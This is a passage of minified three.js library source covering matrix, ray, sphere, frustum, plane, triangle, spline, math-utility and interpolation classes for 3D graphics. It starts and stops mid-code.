e=0;e<d;e++,c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),a.applyMatrix4(this),b.setXYZ(a.x,a.y,a.z);return b}}(),determinant:function(){var a=this.elements,b=a[0],c=a[4],d=a[8],e=a[12],f=a[1],g=\na[5],h=a[9],k=a[13],l=a[2],n=a[6],p=a[10],m=a[14];return a[3]*(+e*h*n-d*k*n-e*g*p+c*k*p+d*g*m-c*h*m)+a[7]*(+b*h*m-b*k*p+e*f*p-d*f*m+d*k*l-e*h*l)+a[11]*(+b*k*n-b*g*m-e*f*n+c*f*m+e*g*l-c*k*l)+a[15]*(-d*g*l-b*h*n+b*g*p+d*f*n-c*f*p+c*h*l)},transpose:function(){var a=this.elements,b;b=a[1];a[1]=a[4];a[4]=b;b=a[2];a[2]=a[8];a[8]=b;b=a[6];a[6]=a[9];a[9]=b;b=a[3];a[3]=a[12];a[12]=b;b=a[7];a[7]=a[13];a[13]=b;b=a[11];a[11]=a[14];a[14]=b;return this},flattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix3: .flattenToArrayOffset is deprecated - just use .toArray instead.\");\nreturn this.toArray(a,b)},getPosition:function(){var a;return function(){void 0===a&&(a=new THREE.Vector3);console.warn(\"THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.\");return a.setFromMatrixColumn(this,3)}}(),setPosition:function(a){var b=this.elements;b[12]=a.x;b[13]=a.y;b[14]=a.z;return this},getInverse:function(a,b){var c=this.elements,d=a.elements,e=d[0],f=d[1],g=d[2],h=d[3],k=d[4],l=d[5],n=d[6],p=d[7],m=d[8],q=d[9],r=d[10],s=d[11],t=d[12],\nu=d[13],v=d[14],d=d[15],C=q*v*p-u*r*p+u*n*s-l*v*s-q*n*d+l*r*d,w=t*r*p-m*v*p-t*n*s+k*v*s+m*n*d-k*r*d,E=m*u*p-t*q*p+t*l*s-k*u*s-m*l*d+k*q*d,z=t*q*n-m*u*n-t*l*r+k*u*r+m*l*v-k*q*v,y=e*C+f*w+g*E+h*z;if(0===y){if(b)throw Error(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}y=1/y;c[0]=C*y;c[1]=(u*r*h-q*v*h-u*g*s+f*v*s+q*g*d-f*r*d)*y;c[2]=(l*v*h-u*n*h+u*g*p-f*v*p-l*g*d+f*n*d)*y;c[3]=\n(q*n*h-l*r*h-q*g*p+f*r*p+l*g*s-f*n*s)*y;c[4]=w*y;c[5]=(m*v*h-t*r*h+t*g*s-e*v*s-m*g*d+e*r*d)*y;c[6]=(t*n*h-k*v*h-t*g*p+e*v*p+k*g*d-e*n*d)*y;c[7]=(k*r*h-m*n*h+m*g*p-e*r*p-k*g*s+e*n*s)*y;c[8]=E*y;c[9]=(t*q*h-m*u*h-t*f*s+e*u*s+m*f*d-e*q*d)*y;c[10]=(k*u*h-t*l*h+t*f*p-e*u*p-k*f*d+e*l*d)*y;c[11]=(m*l*h-k*q*h-m*f*p+e*q*p+k*f*s-e*l*s)*y;c[12]=z*y;c[13]=(m*u*g-t*q*g+t*f*r-e*u*r-m*f*v+e*q*v)*y;c[14]=(t*l*g-k*u*g-t*f*n+e*u*n+k*f*v-e*l*v)*y;c[15]=(k*q*g-m*l*g+m*f*n-e*q*n-k*f*r+e*l*r)*y;return this},scale:function(a){var b=\nthis.elements,c=a.x,d=a.y;a=a.z;b[0]*=c;b[4]*=d;b[8]*=a;b[1]*=c;b[5]*=d;b[9]*=a;b[2]*=c;b[6]*=d;b[10]*=a;b[3]*=c;b[7]*=d;b[11]*=a;return this},getMaxScaleOnAxis:function(){var a=this.elements;return Math.sqrt(Math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10]))},makeTranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return this},makeRotationX:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(1,0,0,0,0,b,-a,0,0,a,b,0,0,0,0,1);\nreturn this},makeRotationY:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,0,a,0,0,1,0,0,-a,0,b,0,0,0,0,1);return this},makeRotationZ:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,-a,0,0,a,b,0,0,0,0,1,0,0,0,0,1);return this},makeRotationAxis:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=1-c,f=a.x,g=a.y,h=a.z,k=e*f,l=e*g;this.set(k*f+c,k*g-d*h,k*h+d*g,0,k*g+d*h,l*g+c,l*h-d*f,0,k*h-d*g,l*h+d*f,e*h*h+c,0,0,0,0,1);return this},makeScale:function(a,b,c){this.set(a,0,0,0,0,b,0,0,0,0,c,\n0,0,0,0,1);return this},compose:function(a,b,c){this.makeRotationFromQuaternion(b);this.scale(c);this.setPosition(a);return this},decompose:function(){var a,b;return function(c,d,e){void 0===a&&(a=new THREE.Vector3,b=new THREE.Matrix4);var f=this.elements,g=a.set(f[0],f[1],f[2]).length(),h=a.set(f[4],f[5],f[6]).length(),k=a.set(f[8],f[9],f[10]).length();0>this.determinant()&&(g=-g);c.x=f[12];c.y=f[13];c.z=f[14];b.elements.set(this.elements);c=1/g;var f=1/h,l=1/k;b.elements[0]*=c;b.elements[1]*=c;\nb.elements[2]*=c;b.elements[4]*=f;b.elements[5]*=f;b.elements[6]*=f;b.elements[8]*=l;b.elements[9]*=l;b.elements[10]*=l;d.setFromRotationMatrix(b);e.x=g;e.y=h;e.z=k;return this}}(),makeFrustum:function(a,b,c,d,e,f){var g=this.elements;g[0]=2*e/(b-a);g[4]=0;g[8]=(b+a)/(b-a);g[12]=0;g[1]=0;g[5]=2*e/(d-c);g[9]=(d+c)/(d-c);g[13]=0;g[2]=0;g[6]=0;g[10]=-(f+e)/(f-e);g[14]=-2*f*e/(f-e);g[3]=0;g[7]=0;g[11]=-1;g[15]=0;return this},makePerspective:function(a,b,c,d){a=c*Math.tan(THREE.Math.DEG2RAD*a*.5);var e=\n-a;return this.makeFrustum(e*b,a*b,e,a,c,d)},makeOrthographic:function(a,b,c,d,e,f){var g=this.elements,h=1/(b-a),k=1/(c-d),l=1/(f-e);g[0]=2*h;g[4]=0;g[8]=0;g[12]=-((b+a)*h);g[1]=0;g[5]=2*k;g[9]=0;g[13]=-((c+d)*k);g[2]=0;g[6]=0;g[10]=-2*l;g[14]=-((f+e)*l);g[3]=0;g[7]=0;g[11]=0;g[15]=1;return this},equals:function(a){var b=this.elements;a=a.elements;for(var c=0;16>c;c++)if(b[c]!==a[c])return!1;return!0},fromArray:function(a){this.elements.set(a);return this},toArray:function(a,b){void 0===a&&(a=[]);\nvoid 0===b&&(b=0);var c=this.elements;a[b]=c[0];a[b+1]=c[1];a[b+2]=c[2];a[b+3]=c[3];a[b+4]=c[4];a[b+5]=c[5];a[b+6]=c[6];a[b+7]=c[7];a[b+8]=c[8];a[b+9]=c[9];a[b+10]=c[10];a[b+11]=c[11];a[b+12]=c[12];a[b+13]=c[13];a[b+14]=c[14];a[b+15]=c[15];return a}};THREE.Ray=function(a,b){this.origin=void 0!==a?a:new THREE.Vector3;this.direction=void 0!==b?b:new THREE.Vector3};\nTHREE.Ray.prototype={constructor:THREE.Ray,set:function(a,b){this.origin.copy(a);this.direction.copy(b);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.origin.copy(a.origin);this.direction.copy(a.direction);return this},at:function(a,b){return(b||new THREE.Vector3).copy(this.direction).multiplyScalar(a).add(this.origin)},lookAt:function(a){this.direction.copy(a).sub(this.origin).normalize();return this},recast:function(){var a=new THREE.Vector3;return function(b){this.origin.copy(this.at(b,\na));return this}}(),closestPointToPoint:function(a,b){var c=b||new THREE.Vector3;c.subVectors(a,this.origin);var d=c.dot(this.direction);return 0>d?c.copy(this.origin):c.copy(this.direction).multiplyScalar(d).add(this.origin)},distanceToPoint:function(a){return Math.sqrt(this.distanceSqToPoint(a))},distanceSqToPoint:function(){var a=new THREE.Vector3;return function(b){var c=a.subVectors(b,this.origin).dot(this.direction);if(0>c)return this.origin.distanceToSquared(b);a.copy(this.direction).multiplyScalar(c).add(this.origin);\nreturn a.distanceToSquared(b)}}(),distanceSqToSegment:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(d,e,f,g){a.copy(d).add(e).multiplyScalar(.5);b.copy(e).sub(d).normalize();c.copy(this.origin).sub(a);var h=.5*d.distanceTo(e),k=-this.direction.dot(b),l=c.dot(this.direction),n=-c.dot(b),p=c.lengthSq(),m=Math.abs(1-k*k),q;0<m?(d=k*n-l,e=k*l-n,q=h*m,0<=d?e>=-q?e<=q?(h=1/m,d*=h,e*=h,k=d*(d+k*e+2*l)+e*(k*d+e+2*n)+p):(e=h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*\nn)+p):(e=-h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p):e<=-q?(d=Math.max(0,-(-k*h+l)),e=0<d?-h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p):e<=q?(d=0,e=Math.min(Math.max(-h,-n),h),k=e*(e+2*n)+p):(d=Math.max(0,-(k*h+l)),e=0<d?h:Math.min(Math.max(-h,-n),h),k=-d*d+e*(e+2*n)+p)):(e=0<k?-h:h,d=Math.max(0,-(k*e+l)),k=-d*d+e*(e+2*n)+p);f&&f.copy(this.direction).multiplyScalar(d).add(this.origin);g&&g.copy(b).multiplyScalar(e).add(a);return k}}(),intersectSphere:function(){var a=new THREE.Vector3;return function(b,\nc){a.subVectors(b.center,this.origin);var d=a.dot(this.direction),e=a.dot(a)-d*d,f=b.radius*b.radius;if(e>f)return null;f=Math.sqrt(f-e);e=d-f;d+=f;return 0>e&&0>d?null:0>e?this.at(d,c):this.at(e,c)}}(),intersectsSphere:function(a){return this.distanceToPoint(a.center)<=a.radius},distanceToPlane:function(a){var b=a.normal.dot(this.direction);if(0===b)return 0===a.distanceToPoint(this.origin)?0:null;a=-(this.origin.dot(a.normal)+a.constant)/b;return 0<=a?a:null},intersectPlane:function(a,b){var c=\nthis.distanceToPlane(a);return null===c?null:this.at(c,b)},intersectsPlane:function(a){var b=a.distanceToPoint(this.origin);return 0===b||0>a.normal.dot(this.direction)*b?!0:!1},intersectBox:function(a,b){var c,d,e,f,g;d=1/this.direction.x;f=1/this.direction.y;g=1/this.direction.z;var h=this.origin;0<=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c>f||e>d)return null;if(e>c||c!==c)c=e;if(f<d||d!==\nd)d=f;0<=g?(e=(a.min.z-h.z)*g,g*=a.max.z-h.z):(e=(a.max.z-h.z)*g,g*=a.min.z-h.z);if(c>g||e>d)return null;if(e>c||c!==c)c=e;if(g<d||d!==d)d=g;return 0>d?null:this.at(0<=c?c:d,b)},intersectsBox:function(){var a=new THREE.Vector3;return function(b){return null!==this.intersectBox(b,a)}}(),intersectTriangle:function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3,d=new THREE.Vector3;return function(e,f,g,h,k){b.subVectors(f,e);c.subVectors(g,e);d.crossVectors(b,c);f=this.direction.dot(d);\nif(0<f){if(h)return null;h=1}else if(0>f)h=-1,f=-f;else return null;a.subVectors(this.origin,e);e=h*this.direction.dot(c.crossVectors(a,c));if(0>e)return null;g=h*this.direction.dot(b.cross(a));if(0>g||e+g>f)return null;e=-h*a.dot(d);return 0>e?null:this.at(e/f,k)}}(),applyMatrix4:function(a){this.direction.add(this.origin).applyMatrix4(a);this.origin.applyMatrix4(a);this.direction.sub(this.origin);this.direction.normalize();return this},equals:function(a){return a.origin.equals(this.origin)&&a.direction.equals(this.direction)}};\nTHREE.Sphere=function(a,b){this.center=void 0!==a?a:new THREE.Vector3;this.radius=void 0!==b?b:0};\nTHREE.Sphere.prototype={constructor:THREE.Sphere,set:function(a,b){this.center.copy(a);this.radius=b;return this},setFromPoints:function(){var a=new THREE.Box3;return function(b,c){var d=this.center;void 0!==c?d.copy(c):a.setFromPoints(b).center(d);for(var e=0,f=0,g=b.length;f<g;f++)e=Math.max(e,d.distanceToSquared(b[f]));this.radius=Math.sqrt(e);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.center.copy(a.center);this.radius=a.radius;return this},\nempty:function(){return 0>=this.radius},containsPoint:function(a){return a.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(a){return a.distanceTo(this.center)-this.radius},intersectsSphere:function(a){var b=this.radius+a.radius;return a.center.distanceToSquared(this.center)<=b*b},intersectsBox:function(a){return a.intersectsSphere(this)},intersectsPlane:function(a){return Math.abs(this.center.dot(a.normal)-a.constant)<=this.radius},clampPoint:function(a,b){var c=\nthis.center.distanceToSquared(a),d=b||new THREE.Vector3;d.copy(a);c>this.radius*this.radius&&(d.sub(this.center).normalize(),d.multiplyScalar(this.radius).add(this.center));return d},getBoundingBox:function(a){a=a||new THREE.Box3;a.set(this.center,this.center);a.expandByScalar(this.radius);return a},applyMatrix4:function(a){this.center.applyMatrix4(a);this.radius*=a.getMaxScaleOnAxis();return this},translate:function(a){this.center.add(a);return this},equals:function(a){return a.center.equals(this.center)&&\na.radius===this.radius}};THREE.Frustum=function(a,b,c,d,e,f){this.planes=[void 0!==a?a:new THREE.Plane,void 0!==b?b:new THREE.Plane,void 0!==c?c:new THREE.Plane,void 0!==d?d:new THREE.Plane,void 0!==e?e:new THREE.Plane,void 0!==f?f:new THREE.Plane]};\nTHREE.Frustum.prototype={constructor:THREE.Frustum,set:function(a,b,c,d,e,f){var g=this.planes;g[0].copy(a);g[1].copy(b);g[2].copy(c);g[3].copy(d);g[4].copy(e);g[5].copy(f);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){for(var b=this.planes,c=0;6>c;c++)b[c].copy(a.planes[c]);return this},setFromMatrix:function(a){var b=this.planes,c=a.elements;a=c[0];var d=c[1],e=c[2],f=c[3],g=c[4],h=c[5],k=c[6],l=c[7],n=c[8],p=c[9],m=c[10],q=c[11],r=c[12],s=c[13],t=c[14],\nc=c[15];b[0].setComponents(f-a,l-g,q-n,c-r).normalize();b[1].setComponents(f+a,l+g,q+n,c+r).normalize();b[2].setComponents(f+d,l+h,q+p,c+s).normalize();b[3].setComponents(f-d,l-h,q-p,c-s).normalize();b[4].setComponents(f-e,l-k,q-m,c-t).normalize();b[5].setComponents(f+e,l+k,q+m,c+t).normalize();return this},intersectsObject:function(){var a=new THREE.Sphere;return function(b){var c=b.geometry;null===c.boundingSphere&&c.computeBoundingSphere();a.copy(c.boundingSphere).applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),\nintersectsSprite:function(){var a=new THREE.Sphere;return function(b){a.center.set(0,0,0);a.radius=.7071067811865476;a.applyMatrix4(b.matrixWorld);return this.intersectsSphere(a)}}(),intersectsSphere:function(a){var b=this.planes,c=a.center;a=-a.radius;for(var d=0;6>d;d++)if(b[d].distanceToPoint(c)<a)return!1;return!0},intersectsBox:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){for(var d=this.planes,e=0;6>e;e++){var f=d[e];a.x=0<f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x?\nc.max.x:c.min.x;a.y=0<f.normal.y?c.min.y:c.max.y;b.y=0<f.normal.y?c.max.y:c.min.y;a.z=0<f.normal.z?c.min.z:c.max.z;b.z=0<f.normal.z?c.max.z:c.min.z;var g=f.distanceToPoint(a),f=f.distanceToPoint(b);if(0>g&&0>f)return!1}return!0}}(),containsPoint:function(a){for(var b=this.planes,c=0;6>c;c++)if(0>b[c].distanceToPoint(a))return!1;return!0}};THREE.Plane=function(a,b){this.normal=void 0!==a?a:new THREE.Vector3(1,0,0);this.constant=void 0!==b?b:0};\nTHREE.Plane.prototype={constructor:THREE.Plane,set:function(a,b){this.normal.copy(a);this.constant=b;return this},setComponents:function(a,b,c,d){this.normal.set(a,b,c);this.constant=d;return this},setFromNormalAndCoplanarPoint:function(a,b){this.normal.copy(a);this.constant=-b.dot(this.normal);return this},setFromCoplanarPoints:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,d,e){d=a.subVectors(e,d).cross(b.subVectors(c,d)).normalize();this.setFromNormalAndCoplanarPoint(d,\nc);return this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.normal.copy(a.normal);this.constant=a.constant;return this},normalize:function(){var a=1/this.normal.length();this.normal.multiplyScalar(a);this.constant*=a;return this},negate:function(){this.constant*=-1;this.normal.negate();return this},distanceToPoint:function(a){return this.normal.dot(a)+this.constant},distanceToSphere:function(a){return this.distanceToPoint(a.center)-a.radius},projectPoint:function(a,\nb){return this.orthoPoint(a,b).sub(a).negate()},orthoPoint:function(a,b){var c=this.distanceToPoint(a);return(b||new THREE.Vector3).copy(this.normal).multiplyScalar(c)},intersectLine:function(){var a=new THREE.Vector3;return function(b,c){var d=c||new THREE.Vector3,e=b.delta(a),f=this.normal.dot(e);if(0===f){if(0===this.distanceToPoint(b.start))return d.copy(b.start)}else return f=-(b.start.dot(this.normal)+this.constant)/f,0>f||1<f?void 0:d.copy(e).multiplyScalar(f).add(b.start)}}(),intersectsLine:function(a){var b=\nthis.distanceToPoint(a.start);a=this.distanceToPoint(a.end);return 0>b&&0<a||0>a&&0<b},intersectsBox:function(a){return a.intersectsPlane(this)},intersectsSphere:function(a){return a.intersectsPlane(this)},coplanarPoint:function(a){return(a||new THREE.Vector3).copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(){var a=new THREE.Vector3,b=new THREE.Matrix3;return function(c,d){var e=this.coplanarPoint(a).applyMatrix4(c),f=d||b.getNormalMatrix(c),f=this.normal.applyMatrix3(f).normalize();\nthis.constant=-e.dot(f);return this}}(),translate:function(a){this.constant-=a.dot(this.normal);return this},equals:function(a){return a.normal.equals(this.normal)&&a.constant===this.constant}};THREE.Spherical=function(a,b,c){this.radius=void 0!==a?a:1;this.phi=void 0!==b?b:0;this.theta=void 0!==c?c:0;return this};\nTHREE.Spherical.prototype={constructor:THREE.Spherical,set:function(a,b,c){this.radius=a;this.phi=b;this.theta=c;return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.radius.copy(a.radius);this.phi.copy(a.phi);this.theta.copy(a.theta);return this},makeSafe:function(){this.phi=Math.max(1E-6,Math.min(Math.PI-1E-6,this.phi));return this},setFromVector3:function(a){this.radius=a.length();0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(a.x,a.z),this.phi=\nMath.acos(THREE.Math.clamp(a.y/this.radius,-1,1)));return this}};\nTHREE.Math={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var a=\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\".split(\"\"),b=Array(36),c=0,d;return function(){for(var e=0;36>e;e++)8===e||13===e||18===e||23===e?b[e]=\"-\":14===e?b[e]=\"4\":(2>=c&&(c=33554432+16777216*Math.random()|0),d=c&15,c>>=4,b[e]=a[19===e?d&3|8:d]);return b.join(\"\")}}(),clamp:function(a,b,c){return Math.max(b,Math.min(c,a))},euclideanModulo:function(a,b){return(a%b+b)%b},mapLinear:function(a,b,c,\nd,e){return d+(a-b)*(e-d)/(c-b)},smoothstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},random16:function(){console.warn(\"THREE.Math.random16() has been deprecated. Use Math.random() instead.\");return Math.random()},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*\n(.5-Math.random())},degToRad:function(a){return a*THREE.Math.DEG2RAD},radToDeg:function(a){return a*THREE.Math.RAD2DEG},isPowerOfTwo:function(a){return 0===(a&a-1)&&0!==a},nearestPowerOfTwo:function(a){return Math.pow(2,Math.round(Math.log(a)/Math.LN2))},nextPowerOfTwo:function(a){a--;a|=a>>1;a|=a>>2;a|=a>>4;a|=a>>8;a|=a>>16;a++;return a}};\nTHREE.Spline=function(a){function b(a,b,c,d,e,f,g){a=.5*(c-a);d=.5*(d-b);return(2*(b-c)+a+d)*g+(-3*(b-c)-2*a-d)*f+a*e+b}this.points=a;var c=[],d={x:0,y:0,z:0},e,f,g,h,k,l,n,p,m;this.initFromArray=function(a){this.points=[];for(var b=0;b<a.length;b++)this.points[b]={x:a[b][0],y:a[b][1],z:a[b][2]}};this.getPoint=function(a){e=(this.points.length-1)*a;f=Math.floor(e);g=e-f;c[0]=0===f?f:f-1;c[1]=f;c[2]=f>this.points.length-2?this.points.length-1:f+1;c[3]=f>this.points.length-3?this.points.length-1:f+\n2;l=this.points[c[0]];n=this.points[c[1]];p=this.points[c[2]];m=this.points[c[3]];h=g*g;k=g*h;d.x=b(l.x,n.x,p.x,m.x,g,h,k);d.y=b(l.y,n.y,p.y,m.y,g,h,k);d.z=b(l.z,n.z,p.z,m.z,g,h,k);return d};this.getControlPointsArray=function(){var a,b,c=this.points.length,d=[];for(a=0;a<c;a++)b=this.points[a],d[a]=[b.x,b.y,b.z];return d};this.getLength=function(a){var b,c,d,e=b=b=0,f=new THREE.Vector3,g=new THREE.Vector3,h=[],k=0;h[0]=0;a||(a=100);c=this.points.length*a;f.copy(this.points[0]);for(a=1;a<c;a++)b=\na/c,d=this.getPoint(b),g.copy(d),k+=g.distanceTo(f),f.copy(d),b*=this.points.length-1,b=Math.floor(b),b!==e&&(h[b]=k,e=b);h[h.length]=k;return{chunks:h,total:k}};this.reparametrizeByArcLength=function(a){var b,c,d,e,f,g,h=[],k=new THREE.Vector3,m=this.getLength();h.push(k.copy(this.points[0]).clone());for(b=1;b<this.points.length;b++){c=m.chunks[b]-m.chunks[b-1];g=Math.ceil(a*c/m.total);e=(b-1)/(this.points.length-1);f=b/(this.points.length-1);for(c=1;c<g-1;c++)d=e+1/g*c*(f-e),d=this.getPoint(d),\nh.push(k.copy(d).clone());h.push(k.copy(this.points[b]).clone())}this.points=h}};THREE.Triangle=function(a,b,c){this.a=void 0!==a?a:new THREE.Vector3;this.b=void 0!==b?b:new THREE.Vector3;this.c=void 0!==c?c:new THREE.Vector3};THREE.Triangle.normal=function(){var a=new THREE.Vector3;return function(b,c,d,e){e=e||new THREE.Vector3;e.subVectors(d,c);a.subVectors(b,c);e.cross(a);b=e.lengthSq();return 0<b?e.multiplyScalar(1/Math.sqrt(b)):e.set(0,0,0)}}();\nTHREE.Triangle.barycoordFromPoint=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(d,e,f,g,h){a.subVectors(g,e);b.subVectors(f,e);c.subVectors(d,e);d=a.dot(a);e=a.dot(b);f=a.dot(c);var k=b.dot(b);g=b.dot(c);var l=d*k-e*e;h=h||new THREE.Vector3;if(0===l)return h.set(-2,-1,-1);l=1/l;k=(k*f-e*g)*l;d=(d*g-e*f)*l;return h.set(1-k-d,d,k)}}();\nTHREE.Triangle.containsPoint=function(){var a=new THREE.Vector3;return function(b,c,d,e){b=THREE.Triangle.barycoordFromPoint(b,c,d,e,a);return 0<=b.x&&0<=b.y&&1>=b.x+b.y}}();\nTHREE.Triangle.prototype={constructor:THREE.Triangle,set:function(a,b,c){this.a.copy(a);this.b.copy(b);this.c.copy(c);return this},setFromPointsAndIndices:function(a,b,c,d){this.a.copy(a[b]);this.b.copy(a[c]);this.c.copy(a[d]);return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.a.copy(a.a);this.b.copy(a.b);this.c.copy(a.c);return this},area:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){a.subVectors(this.c,this.b);b.subVectors(this.a,\nthis.b);return.5*a.cross(b).length()}}(),midpoint:function(a){return(a||new THREE.Vector3).addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},normal:function(a){return THREE.Triangle.normal(this.a,this.b,this.c,a)},plane:function(a){return(a||new THREE.Plane).setFromCoplanarPoints(this.a,this.b,this.c)},barycoordFromPoint:function(a,b){return THREE.Triangle.barycoordFromPoint(a,this.a,this.b,this.c,b)},containsPoint:function(a){return THREE.Triangle.containsPoint(a,this.a,this.b,this.c)},\nclosestPointToPoint:function(){var a,b,c,d;return function(e,f){void 0===a&&(a=new THREE.Plane,b=[new THREE.Line3,new THREE.Line3,new THREE.Line3],c=new THREE.Vector3,d=new THREE.Vector3);var g=f||new THREE.Vector3,h=Infinity;a.setFromCoplanarPoints(this.a,this.b,this.c);a.projectPoint(e,c);if(!0===this.containsPoint(c))g.copy(c);else{b[0].set(this.a,this.b);b[1].set(this.b,this.c);b[2].set(this.c,this.a);for(var k=0;k<b.length;k++){b[k].closestPointToPoint(c,!0,d);var l=c.distanceToSquared(d);l<\nh&&(h=l,g.copy(d))}}return g}}(),equals:function(a){return a.a.equals(this.a)&&a.b.equals(this.b)&&a.c.equals(this.c)}};THREE.Interpolant=function(a,b,c,d){this.parameterPositions=a;this._cachedIndex=0;this.resultBuffer=void 0!==d?d:new b.constructor(c);this.sampleValues=b;this.valueSize=c};\nTHREE.Interpolant.prototype={constructor:THREE.Interpolant,evaluate:function(a){var b=this.parameterPositions,c=this._cachedIndex,d=b[c],e=b[c-1];a:{b:{c:{d:if(!(a<d)){for(var f=c+2;;){if(void 0===d){if(a<e)break d;this._cachedIndex=c=b.length;return this.afterEnd_(c-1,a,e)}if(c===f)break;e=d;d=b[++c];if(a<d)break b}d=b.length;break c}if(a>=e)break a;else{f=b[1];a<f&&(c=2,e=f);for(f=c-2;;){if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(c===f)break;d=e;e=b[--c-1];if(a>=e)break b}d=\nc;c=0}}for(;c<d;)e=c+d>>>1,a<b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(void 0===d)return this._cachedIndex=c=b.length,this.afterEnd_(c-1,e,a)}this._cachedIndex=c;this.intervalChanged_(c,e,d)}return this.interpolate_(c,e,a,d)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(a){var b=this.resultBuffer,c=this.sampleValues,d=this.valueSize;a*=d;for(var e=0;e!==d;++e)b[e]=\nc[a+e];return b},interpolate_:function(a,b,c,d){throw Error(\"call to abstract method\");},intervalChanged_:function(a,b,c){}};Object.assign(THREE.Interpolant.prototype,{beforeStart_:THREE.Interpolant.prototype.copySampleValue_,afterEnd_:THREE.Interpolant.prototype.copySampleValue_});THREE.CubicInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d);this._offsetNext=this._weightNext=this._offsetPrev=this._weightPrev=-0};\nTHREE.CubicInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.CubicInterpolant,DefaultSettings_:{endingStart:THREE.ZeroCurvatureEnding,endingEnd:THREE.ZeroCurvatureEnding},intervalChanged_:function(a,b,c){var d=this.parameterPositions,e=a-2,f=a+1,g=d[e],h=d[f];if(void 0===g)switch(this.getSettings_().endingStart){case THREE.ZeroSlopeEnding:e=a;g=2*b-c;break;case THREE.WrapAroundEnding:e=d.length-2;g=b+d[e]-d[e+1];break;default:e=a,g=c}if(void 0===h)switch(this.getSettings_().endingEnd){case THREE.ZeroSlopeEnding:f=\na;h=2*c-b;break;case THREE.WrapAroundEnding:f=1;h=c+d[1]-d[0];break;default:f=a-1,h=b}a=.5*(c-b);d=this.valueSize;this._weightPrev=a/(b-g);this._weightNext=a/(h-c);this._offsetPrev=e*d;this._offsetNext=f*d},interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g,k=this._offsetPrev,l=this._offsetNext,n=this._weightPrev,p=this._weightNext,m=(c-b)/(d-b);c=m*m;d=c*m;b=-n*d+2*n*c-n*m;n=(1+n)*d+(-1.5-2*n)*c+(-.5+n)*m+1;m=(-1-p)*d+(1.5+p)*c+.5*m;p=p*d-p*\nc;for(c=0;c!==g;++c)e[c]=b*f[k+c]+n*f[h+c]+m*f[a+c]+p*f[l+c];return e}});THREE.DiscreteInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};THREE.DiscreteInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.DiscreteInterpolant,interpolate_:function(a,b,c,d){return this.copySampleValue_(a-1)}});THREE.LinearInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\nTHREE.LinearInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.LinearInterpolant,interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g;b=(c-b)/(d-b);c=1-b;for(d=0;d!==g;++d)e[d]=f[h+d]*c+f[a+d]*b;return e}});THREE.QuaternionLinearInterpolant=function(a,b,c,d){THREE.Interpolant.call(this,a,b,c,d)};\nTHREE.QuaternionLinearInterpolant.prototype=Object.assign(Object.create(THREE.Interpolant.prototype),{constructor:THREE.QuaternionLinearInterpolant,interpolate_:function(a,b,c,d){var 